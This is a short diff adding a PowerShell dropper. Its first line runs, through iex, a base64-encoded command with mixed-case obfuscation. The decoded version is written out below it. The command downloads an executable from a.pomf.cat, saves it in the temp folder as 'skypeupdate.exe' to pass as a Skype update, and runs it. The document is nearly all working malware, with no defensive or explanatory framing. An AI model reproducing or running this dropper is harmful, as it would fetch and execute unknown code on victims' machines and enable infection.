@@ -1,0 +1,7 @@
+iex([SySTEM.texT.eNcOdInG]::Utf8.GetstrInG([SysTeM.CoNVErT]::FrOMbase64sTRINg('CihOZXctT2JqZWN0IHNZU1RlbS5uRXQuV0ViY0xpZU50KS5kb3dOTG9hZGZJTGUoJ2h0dHBzOi8vYS5wb21mLmNhdC93b3Brd2ouZXhlJywiJGVuVjpURU1QXHNreXBldXBkYXRlLmV4ZSIpO1N0YXJ0LVByb2Nlc3MgKCIkZW5WOlRFTVBcc2t5cGV1cGRhdGUuZXhlIikKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYSTem.nEt.WEbcLieNt).dowNLoadfILe('https://a.pomf.cat/wopkwj.exe',"$enV:TEMP\skypeupdate.exe");Start-Process ("$enV:TEMP\skypeupdate.exe")
+
